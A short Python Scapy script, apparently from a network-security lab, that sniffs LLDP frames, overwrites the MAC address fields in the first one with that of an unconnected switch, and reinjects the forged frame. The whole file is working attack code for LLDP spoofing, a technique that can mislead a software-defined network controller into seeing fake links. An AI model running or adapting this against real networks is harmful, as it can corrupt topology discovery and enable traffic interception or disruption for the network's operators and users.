from scapy.all import *


s = sniff(count=50)

lldp_pckts = []
for p in s:
    if(p.type == 35020):
        lldp_pckts.append(p)


mac_switch = '421dd3120740' #mac di uno switch non collegato

evil_packet = lldp_pckts[0]
load = evil_packet.load

lista=[]

i=0
while(i<len(load)):
   if(load[i]==58):
      lista.append(58)
      i+=1
      j=0
      while(j<12):
         lista.append(ord(mac_switch[j]))
         j+=1
      i+=j
   else:
      lista.append(load[i])
      i+=1

evil_packet.load = bytes(lista)

sendp(evil_packet)
